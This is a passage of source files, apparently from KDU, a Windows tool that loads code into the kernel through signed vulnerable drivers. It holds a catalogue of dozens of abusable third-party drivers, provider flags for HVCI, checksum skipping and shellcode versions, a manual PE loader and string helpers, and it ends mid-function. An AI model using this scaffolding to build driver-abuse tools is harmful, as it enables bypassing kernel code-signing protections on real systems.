#define CPU_VENDOR_INTEL_LENGTH sizeof(CPU_VENDOR_INTEL) - sizeof(CHAR)
#define CPU_VENDOR_AMD          "AuthenticAMD"
#define CPU_VENDOR_AMD_LENGTH   sizeof(CPU_VENDOR_AMD) - sizeof(CHAR)

#define SHELL_POOL_TAG          '  oI'

#define PROVIDER_RES_KEY        0xF62E6CE0

#define SYSTEM_PID_MAGIC        4

#define TEXT_SECTION            ".text"
#define TEXT_SECTION_LENGTH     sizeof(TEXT_SECTION)

#define SHELLCODE_SMALL         0x200

#ifndef MAX_CLASS_NAME_LEN
#define MAX_CLASS_NAME_LEN      256
#endif

//
// Victim providers id table
//
#define KDU_VICTIM_PE1627  0
#define KDU_VICTIM_PE1702  1
#define KDU_VICTIM_MAX     2
#define KDU_VICTIM_DEFAULT KDU_VICTIM_PE1702

//
// Companion id table
//
#define KDU_COMPANION_UNDEFINED_PLACEHOLDER 0
#define KDU_COMPANION_DEFAULT KDU_COMPANION_UNDEFINED_PLACEHOLDER 

//
// Data id table
//
#define IDR_DATA_DBUTILCAT              1000
#define IDR_DATA_DBUTILINF              1001
#define IDR_DATA_KMUEXE                 1002
#define IDR_DATA_KMUSIG                 1003
#define IDR_DATA_ASUSCERTSERVICE        1004
#define IDR_DATA_NEACSAFEINF            1005

//
// Driver id table
//
#define IDR_PROCEXP1627                 2000
#define IDR_PROCEXP1702                 2001
#define IDR_INTEL_NAL                   103
#define IDR_RZPNK                       104
#define IDR_RTCORE64                    105
#define IDR_GDRV                        106
#define IDR_ATSZIO64                    107
#define IDR_MSIO64                      108
#define IDR_GLCKIO2                     109
#define IDR_ENEIO64                     110
#define IDR_WINRING0                    111
#define IDR_ENETECHIO64                 112
#define IDR_PHYMEMX64                   113
#define IDR_RTKIO64                     114
#define IDR_ENETECHIO64B                115
#define IDR_LHA                         116
#define IDR_ASUSIO2                     117
#define IDR_DIRECTIO64                  118
#define IDR_GMERDRV                     119
#define IDR_DBUTIL23                    120
#define IDR_MIMIDRV                     121
#define IDR_KPH                         122
#define IDR_DBUTILDRV2                  123
#define IDR_DBK64                       124
#define IDR_ASUSIO3                     125
#define IDR_HW64                        126
#define IDR_SYSDRV3S                    127
#define IDR_ZEMANA                      128
#define IDR_INPOUTX64                   129
#define IDR_PASSMARK_OSF                130
#define IDR_ASROCKDRV                   131
#define IDR_ALSYSIO64                   132
#define IDR_AMD_RYZENMASTER             133
#define IDR_PHYSMEM                     134
#define IDR_LDD                         135
#define IDR_PCDSRVC                     136
#define IDR_MSI_WINIO                   137
#define IDR_HP_ETDSUPP                  138
#define IDR_KEXPLORE                    139
#define IDR_KOBJEXP                     140
#define IDR_KREGEXP                     141
#define IDR_PHYDMACC                    142
#define IDR_ECHODRV                     143
#define IDR_NVOCLOCK                    144
#define IDR_IREC                        145
#define IDR_AMD_PDFWKRNL                146
#define IDR_AMD_AOD215                  147
#define IDR_WNBIOS64                    148
#define IDR_EVGA_ELEETX1                149
#define IDR_ASROCKDRV2                  150
#define IDR_ASROCKAPPSHOP103            151
#define IDR_ASROCKDRV3                  152
#define IDR_ASROCKDRV4                  153
#define IDR_PMXDRV64                    154
#define IDR_HWRWDRVX64                  155
#define IDR_NEACSAFE64                  156
#define IDR_THROTTLESTOP                157

//
// Vulnerable drivers providers id
//
#define KDU_PROVIDER_INTEL_NAL          0
#define KDU_PROVIDER_UNWINDER_RTCORE    1
#define KDU_PROVIDER_GIGABYTE_GDRV      2
#define KDU_PROVIDER_ASUSTEK_ATSZIO     3
#define KDU_PROVIDER_PATRIOT_MSIO64     4
#define KDU_PROVIDER_GLCKIO2            5
#define KDU_PROVIDER_ENEIO64            6
#define KDU_PROVIDER_WINRING0           7
#define KDU_PROVIDER_ENETECHIO64        8
#define KDU_PROVIDER_PHYMEM64           9
#define KDU_PROVIDER_RTKIO64            10
#define KDU_PROVIDER_ENETECHIO64B       11
#define KDU_PROVIDER_LHA                12
#define KDU_PROVIDER_ASUSIO2            13
#define KDU_PROVIDER_DIRECTIO64         14
#define KDU_PROVIDER_GMER               15
#define KDU_PROVIDER_DBUTIL23           16
#define KDU_PROVIDER_MIMIDRV            17
#define KDU_PROVIDER_KPH                18
#define KDU_PROVIDER_PROCEXP            19
#define KDU_PROVIDER_DBUTILDRV2         20
#define KDU_PROVIDER_DBK64              21
#define KDU_PROVIDER_ASUSIO3            22
#define KDU_PROVIDER_HW64               23
#define KDU_PROVIDER_SYSDRV3S           24
#define KDU_PROVIDER_ZEMANA             25
#define KDU_PROVIDER_INPOUTX64          26
#define KDU_PROVIDER_PASSMARK_OSF       27
#define KDU_PROVIDER_ASROCK             28
#define KDU_PROVIDER_ALCPU              29
#define KDU_PROVIDER_AMD_RYZENMASTER    30
#define KDU_PROVIDER_HR_PHYSMEM         31
#define KDU_PROVIDER_LENOVO_DD          32
#define KDU_PROVIDER_DELL_PCDOC         33
#define KDU_PROVIDER_MSI_WINIO          34
#define KDU_PROVIDER_HP_ETDSUPPORT      35
#define KDU_PROVIDER_KEXPLORE           36
#define KDU_PROVIDER_KOBJEXP            37
#define KDU_PROVIDER_KREGEXP            38
#define KDU_PROVIDER_ECHODRV            39
#define KDU_PROVIDER_NVOCLOCK           40
#define KDU_PROVIDER_BINALYZE_IREC      41
#define KDU_PROVIDER_PHYDMACC           42
#define KDU_PROVIDER_RAZER              43
#define KDU_PROVIDER_AMD_PDFWKRNL       44
#define KDU_PROVIDER_AMD_AOD215         45
#define KDU_PROVIDER_WINCOR             46
#define KDU_PROVIDER_EVGA_ELEETX1       47
#define KDU_PROVIDER_ASROCK2            48
#define KDU_PROVIDER_ASROCK3            49
#define KDU_PROVIDER_ASROCK4            50
#define KDU_PROVIDER_ASROCK5            51
#define KDU_PROVIDER_INTEL_PMXDRV       52
#define KDU_PROVIDER_HWRWDRVX64         53
#define KDU_PROVIDER_NEACSAFE64         54
#define KDU_PROVIDER_TPUP               55
#define KDU_PROVIDER_TOSHIBA            56

#define KDU_PROVIDER_DEFAULT KDU_PROVIDER_INTEL_NAL

//
// KDU provider flags
//
// No optional provider flags specified, this is default value.
//
#define KDUPROV_FLAGS_NONE                  0x00000000

//
// Provider does support HVCI security measures.
//
#define KDUPROV_FLAGS_SUPPORT_HVCI          0x00000001

//
// Provider is WHQL signed.
//
#define KDUPROV_FLAGS_SIGNATURE_WHQL        0x00000002 

//
// Provider has invalid checksum, so do not forceble check it.
// 
// Several valid signed Realtek drivers has invalid checksum set in their PE header.
// This flag will tell KDU to skip it checksum verification at loading stage.
// Note: Windows 7 does check driver checksum to be valid thus such drivers will fail to load here.
//
#define KDUPROV_FLAGS_IGNORE_CHECKSUM       0x00000004

//
// Do not set System/Admin-only security descriptor to the provider driver device.
//
#define KDUPROV_FLAGS_NO_FORCED_SD          0x00000008

//
// Do not unload, driver does not support this.
//
#define KDUPROV_FLAGS_NO_UNLOAD_SUP         0x00000010

//
// Virtual-to-physical addresses translation require low stub for PML4 query.
//
#define KDUPROV_FLAGS_PML4_FROM_LOWSTUB     0x00000020

//
// Does not need victim
//
#define KDUPROV_FLAGS_NO_VICTIM             0x00000040

//
// Provider supports only memory brute-force.
//
#define KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE  0x00000080

//
// When provider support both virtual/physical memory acccess.
//
#define KDUPROV_FLAGS_PREFER_PHYSICAL       0x00000100
#define KDUPROV_FLAGS_PREFER_VIRTUAL        0x00000200

//
// Reserved for future use.
//
#define KDUPROV_FLAGS_COMPANION_REQUIRED    0x00000400

//
// Process with MSFT symbols.
//
#define KDUPROV_FLAGS_USE_SYMBOLS           0x00000800

//
// Provider can be used to open a handle for the specified process.
//
#define KDUPROV_FLAGS_OPENPROCESS_SUPPORTED 0x00001000

//
// Provider is FS filter, it must be handled differently.
//
#define KDUPROV_FLAGS_FS_FILTER            0x00002000

//
// Provider can use Superfetch, it must be handled differently.
//
#define KDUPROV_FLAGS_USE_SUPERFETCH       0x00004000

//
// KDU shellcode support flags
//
#define KDUPROV_SC_NONE (0x000)
#define KDUPROV_SC_V1   (0x001)
#define KDUPROV_SC_V2   (0x002)
#define KDUPROV_SC_V3   (0x004)

#define KDUPROV_SC_ALL_DEFAULT (KDUPROV_SC_V1 | KDUPROV_SC_V2 | KDUPROV_SC_V3)

#define KDUPROV_SC_V4   (0x008)

```

`Source/Shared/kdubase.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2025
*
*  TITLE:       KDUBASE.H
*
*  VERSION:     1.44
*
*  DATE:        19 Aug 2025
*
*  Base KDU definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#pragma warning(disable: 4201)

typedef enum _KDU_SOURCEBASE {
    SourceBaseNone = 0,
    SourceBaseWinIo,
    SourceBaseWinRing0,
    SourceBasePhyMem,
    SourceBaseMapMem,
    SourceBaseRWEverything,
    SourceBaseMax
} KDU_SOURCEBASE;

typedef struct _KDU_DB_ENTRY {
    ULONG MinNtBuildNumberSupport;
    ULONG MaxNtBuildNumberSupport;
    ULONG ResourceId;
    ULONG ProviderId;
    ULONG VictimId;
    KDU_SOURCEBASE DrvSourceBase;
    union {
        ULONG Flags;
        struct {
            ULONG SupportHVCI : 1;
            ULONG SignatureWHQL : 1;
            ULONG IgnoreChecksum : 1;
            ULONG NoForcedSD : 1;
            ULONG NoUnloadSupported : 1;
            ULONG PML4FromLowStub : 1;
            ULONG NoVictim : 1;
            ULONG PhysMemoryBruteForce : 1;
            ULONG PreferPhysical : 1;
            ULONG PreferVirtual : 1;
            ULONG CompanionRequired : 1;
            ULONG UseSymbols : 1;
            ULONG OpenProcessSupported : 1;
            ULONG FsFilter : 1;
            ULONG Reserved : 18;
        };
    };
    ULONG SupportedShellFlags;
    LPWSTR Description;
    LPWSTR DriverName; //only file name, e.g. PROCEXP
    union {
        LPWSTR DeviceName; //device name, e.g. PROCEXP152
        LPWSTR PortName;
    };
    LPWSTR SignerName;
} KDU_DB_ENTRY, * PKDU_DB_ENTRY;

typedef struct _KDU_DB {
    ULONG NumberOfEntries;
    KDU_DB_ENTRY* Entries;
} KDU_DB, * PKDU_DB;

typedef struct _KDU_DB_VERSION {
    WORD MajorVersion;
    WORD MinorVersion;
    WORD Revision;
    WORD Build;
} KDU_DB_VERSION, * PKDU_DB_VERSION;

```

`Source/Shared/ldr/ldr.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       LDR.CPP
*
*  VERSION:     1.16
*
*  DATE:        23 Dec 2023
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

DWORD align_gt(
    DWORD p, 
    DWORD align)
{
    DWORD remainder;
    
    if (align == 0) return p;
    remainder = p % align;
    if (remainder == 0) return p;

    if (p > MAXDWORD - (align - remainder)) return p;
    return p + (align - remainder);
}

DWORD align_le(
    DWORD p,
    DWORD align
)
{
    if ((p % align) == 0)
        return p;

    return p - (p % align);
}

LPVOID PELoaderLoadImage(
    _In_ LPVOID Buffer,
    _Out_opt_ PDWORD SizeOfImage
)
{
    DWORD c, p, rsz;
    DWORD optHeaderSize = 0, headersSize = 0;
    DWORD_PTR delta;
    LPWORD chains;
    LPVOID exeBuffer = NULL;
    PIMAGE_DOS_HEADER dosh;
    PIMAGE_FILE_HEADER fileh;
    PIMAGE_OPTIONAL_HEADER popth;
    PIMAGE_SECTION_HEADER sections;
    PIMAGE_BASE_RELOCATION rel;
    PIMAGE_NT_HEADERS nth = NULL;

    do {
        if (Buffer == NULL) {
            SetLastError(ERROR_INVALID_PARAMETER);
            break;
        }

        // check image headers
        // we are supposed to deal with valid or system bins usually so these checks are slightly redurant

        dosh = (PIMAGE_DOS_HEADER)Buffer;
        if (dosh->e_magic != IMAGE_DOS_SIGNATURE) {
            SetLastError(ERROR_BAD_EXE_FORMAT);
            break;
        }

        if (dosh->e_lfanew < sizeof(IMAGE_DOS_HEADER) || dosh->e_lfanew > 0xFFFFF) {
            SetLastError(ERROR_INVALID_EXE_SIGNATURE);
            break;
        }

        nth = (PIMAGE_NT_HEADERS)((PBYTE)Buffer + dosh->e_lfanew);
        if (nth->Signature != IMAGE_NT_SIGNATURE) {
            SetLastError(ERROR_INVALID_EXE_SIGNATURE);
            break;
        }

        fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
        optHeaderSize = fileh->SizeOfOptionalHeader;
        if (optHeaderSize != sizeof(IMAGE_OPTIONAL_HEADER32) &&
            optHeaderSize != sizeof(IMAGE_OPTIONAL_HEADER64)) {
            SetLastError(ERROR_BAD_EXE_FORMAT);
            break;
        }

        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
        if (popth->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC &&
            popth->Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            SetLastError(ERROR_EXE_MARKED_INVALID);
            break;
        }

        if (SizeOfImage) *SizeOfImage = popth->SizeOfImage;

        // render image
        headersSize = align_gt(popth->SizeOfHeaders, popth->FileAlignment);
        if (headersSize > popth->SizeOfImage) {
            SetLastError(ERROR_BAD_EXE_FORMAT);
            break;
        }

        exeBuffer = VirtualAlloc(NULL, popth->SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (exeBuffer == NULL) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
            break;
        }

        memcpy(exeBuffer, Buffer, min(headersSize, popth->SizeOfHeaders));

        sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);
        for (c = 0; c < fileh->NumberOfSections; c++) {
            if ((sections[c].SizeOfRawData > 0) && (sections[c].PointerToRawData > 0)) {
                memcpy((PBYTE)exeBuffer + sections[c].VirtualAddress,
                    (PBYTE)Buffer + align_le(sections[c].PointerToRawData, popth->FileAlignment),
                    align_gt(sections[c].SizeOfRawData, popth->FileAlignment));
            }
        }

        // reloc image
        dosh = (PIMAGE_DOS_HEADER)exeBuffer;
        fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));

        if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
            if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
            {
                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)exeBuffer + popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
                rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                delta = (DWORD_PTR)exeBuffer - popth->ImageBase;

                c = 0;
                while (c < rsz) {
                    p = sizeof(IMAGE_BASE_RELOCATION);
                    chains = (LPWORD)((PBYTE)rel + p);

                    while (p < rel->SizeOfBlock) {

                        switch (*chains >> 12) {
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(LPDWORD)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                            break;
                        case IMAGE_REL_BASED_DIR64:
                            *(PULONGLONG)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                            break;
                        }

                        chains++;
                        p += sizeof(WORD);
                    }

                    c += rel->SizeOfBlock;
                    rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                }
            }

        return exeBuffer;

    } while (FALSE);

    return NULL;
}

LPVOID PELoaderGetProcAddress(
    _In_ LPVOID ImageBase,
    _In_ PCHAR RoutineName
)
{
    USHORT OrdinalIndex;
    LONG Result;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PULONG NameTableBase, FunctionTableBase;
    PUSHORT NameOrdinalTableBase;
    PCHAR CurrentName;
    ULONG High, Low, Middle = 0;
    ULONG ExportDirRVA, ExportDirSize;
    ULONG FunctionRVA;

    union {
        PIMAGE_NT_HEADERS64 nt64;
        PIMAGE_NT_HEADERS32 nt32;
        PIMAGE_NT_HEADERS nt;
    } NtHeaders;

    if (ImageBase == NULL || RoutineName == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return NULL;
    }

    NtHeaders.nt = RtlImageNtHeader(ImageBase);
    if (NtHeaders.nt == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return NULL;
    }

    if (NtHeaders.nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
        ExportDirRVA = NtHeaders.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        ExportDirSize = NtHeaders.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
    else if (NtHeaders.nt->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
        ExportDirRVA = NtHeaders.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        ExportDirSize = NtHeaders.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
    else {
        SetLastError(ERROR_EXE_MACHINE_TYPE_MISMATCH);
        return NULL;
    }

    if (ExportDirRVA == 0 || ExportDirSize == 0) {
        SetLastError(ERROR_PROC_NOT_FOUND);
        return NULL;
    }

    ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)RtlOffsetToPointer((ULONG_PTR)ImageBase, ExportDirRVA);
    NameTableBase = (PULONG)RtlOffsetToPointer(ImageBase, (ULONG)ExportDirectory->AddressOfNames);
    NameOrdinalTableBase = (PUSHORT)RtlOffsetToPointer(ImageBase, (ULONG)ExportDirectory->AddressOfNameOrdinals);
    FunctionTableBase = (PULONG)((ULONG_PTR)ImageBase + ExportDirectory->AddressOfFunctions);

    if (ExportDirectory->NumberOfNames == 0) {
        SetLastError(ERROR_PROC_NOT_FOUND);
        return NULL;
    }

    Low = 0;
    High = ExportDirectory->NumberOfNames - 1;

    while (Low <= High) {
        Middle = Low + (High - Low) / 2;
        CurrentName = (PCHAR)RtlOffsetToPointer((ULONG_PTR)ImageBase, NameTableBase[Middle]);
        Result = _strcmp_a(RoutineName, CurrentName);
        if (Result == 0) {
            OrdinalIndex = NameOrdinalTableBase[Middle];
            if (OrdinalIndex >= ExportDirectory->NumberOfFunctions) {
                SetLastError(ERROR_PROC_NOT_FOUND);
                return NULL;
            }
            FunctionRVA = FunctionTableBase[OrdinalIndex];
            if (FunctionRVA == 0) {
                SetLastError(ERROR_PROC_NOT_FOUND);
                return NULL;
            }
            return (LPVOID)RtlOffsetToPointer((ULONG_PTR)ImageBase, FunctionRVA);
        }
        if (Result < 0) {
            if (Middle == 0) break;
            High = Middle - 1;
        }
        else {
            Low = Middle + 1;
        }

    }

    SetLastError(ERROR_PROC_NOT_FOUND);
    return NULL;
}

```

`Source/Shared/ldr/ldr.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       LDR.H
*
*  VERSION:     1.13
*
*  DATE:        05 Feb 2022
*
*  Common header file for PE loader unit.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

LPVOID PELoaderLoadImage(
    _In_ LPVOID Buffer,
    _Out_opt_ PDWORD SizeOfImage);

LPVOID PELoaderGetProcAddress(
    _In_ LPVOID ImageBase,
    _In_ PCHAR RoutineName);

```

`Source/Shared/minirtl/_filename.c`:

```c
#include <Windows.h>
#include "minirtl.h"

char *_filename_a(const char *f)
{
	char *p = (char *)f;

	if (f == 0)
		return 0;

	while (*f != (char)0) {
		if (*f == '\\')
			p = (char *)f + 1;
		f++;
	}
	return p;
}

wchar_t *_filename_w(const wchar_t *f)
{
	wchar_t *p = (wchar_t *)f;

	if (f == 0)
		return 0;

	while (*f != (wchar_t)0) {
		if (*f == (wchar_t)'\\')
			p = (wchar_t *)f + 1;
		f++;
	}
	return p;
}

char *_fileext_a(const char *f)
{
	char *p = 0;

	if (f == 0)
		return 0;

	while (*f != (char)0) {
		if (*f == '.')
			p = (char *)f;
		f++;
	}

	if (p == 0)
		p = (char *)f;

	return p;
}

wchar_t *_fileext_w(const wchar_t *f)
{
	wchar_t *p = 0;

	if (f == 0)
		return 0;

	while (*f != (wchar_t)0) {
		if (*f == (wchar_t)'.')
			p = (wchar_t *)f;
		f++;
	}

	if (p == 0)
		p = (wchar_t *)f;

	return p;
}

char *_filename_noext_a(char *dest, const char *f)
{
    char *p, *l, *dot;

    if ((f == 0) || (dest == 0))
        return 0;

    p = _filename_a(f);
    if (p == 0)
        return 0;

    dot = _strend_a(p);
    if (dot == 0)
        return 0;

    l = p;

    while (*l != (char)0)
    {
        if (*l == '.')
            dot = l;
        l++;
    }

    while (p<dot)
    {
        *dest = *p;
        p++;
        dest++;
    }

    *dest = 0;
    return dest;
}

wchar_t *_filename_noext_w(wchar_t *dest, const wchar_t *f)
{
    wchar_t *p, *l, *dot;

    if ((f == 0) || (dest == 0))
        return 0;

    p = _filename_w(f);
    if (p == 0)
        return 0;

    dot = _strend_w(p);
    if (dot == 0)
        return 0;

    l = p;

    while (*l != (wchar_t)0)
    {
        if (*l == (wchar_t)'.')
            dot = l;
        l++;
    }

    while (p<dot)
    {
        *dest = *p;
        p++;
        dest++;
    }

    *dest = 0;
    return dest;
}

char *_filepath_a(const char *fname, char *fpath)
{
    char *p = (char *)fname, *p0 = (char*)fname, *p1 = (char*)fpath;

	if ((fname == 0) || (fpath == NULL)) 
		return 0;

	while (*fname != (char)0) {
		if (*fname == '\\')
			p = (char *)fname + 1;
		fname++;
	}

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

	return fpath;
}

wchar_t *_filepath_w(const wchar_t *fname, wchar_t *fpath)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname + 1;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

```

`Source/Shared/minirtl/_filename.h`:

```h
#pragma once

#ifndef _FILENAMEH_
#define _FILENAMEH_

char *_filename_a(const char *f);
wchar_t *_filename_w(const wchar_t *f);
char *_fileext_a(const char *f);
wchar_t *_fileext_w(const wchar_t *f);
char *_filename_noext_a(char *dest, const char *f);
wchar_t *_filename_noext_w(wchar_t *dest, const wchar_t *f);
char *_filepath_a(const char *fname, char *fpath);
wchar_t *_filepath_w(const wchar_t *fname, wchar_t *fpath);

#ifdef UNICODE
#define _filename  _filename_w
#define _fileext   _fileext_w
#define _filepath  _filepath_w
#define _filename_noext  _filename_noext_w
#else // ANSI
#define _filename  _filename_a
#define _fileext   _fileext_a
#define _filepath  _filepath_a
#define _filename_noext  _filename_noext_a
#endif

#endif /* _FILENAMEH_ */
```

`Source/Shared/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`Source/Shared/minirtl/_strcmp.c`:

```c
#include "rtltypes.h"

int _strcmp_a(const char *s1, const char *s2)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

int _strcmp_w(const wchar_t *s1, const wchar_t *s2)
{
	wchar_t	c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

```

`Source/Shared/minirtl/_strcmpi.c`:

```c
#include "rtltypes.h"

int _strcmpi_a(const char *s1, const char *s2)
{
	char c1, c2;
	
	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

int _strcmpi_w(const wchar_t *s1, const wchar_t *s2)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

```

`Source/Shared/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`Source/Shared/minirtl/_strend.c`:

```c
#include "rtltypes.h"

char *_strend_a(const char *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (char *)s;
}

wchar_t *_strend_w(const wchar_t *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (wchar_t *)s;
}

```

`Source/Shared/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`Source/Shared/minirtl/_strncmp.c`:

```c
#include "rtltypes.h"

int _strncmp_a(const char *s1, const char *s2, size_t cchars)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

```

`Source/Shared/minirtl/_strncmpi.c`:

```c
#include "rtltypes.h"

int _strncmpi_a(const char *s1, const char *s2, size_t cchars)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

```

`Source/Shared/minirtl/_strncpy.c`:

```c
#include "rtltypes.h"

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc)
{
	char *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
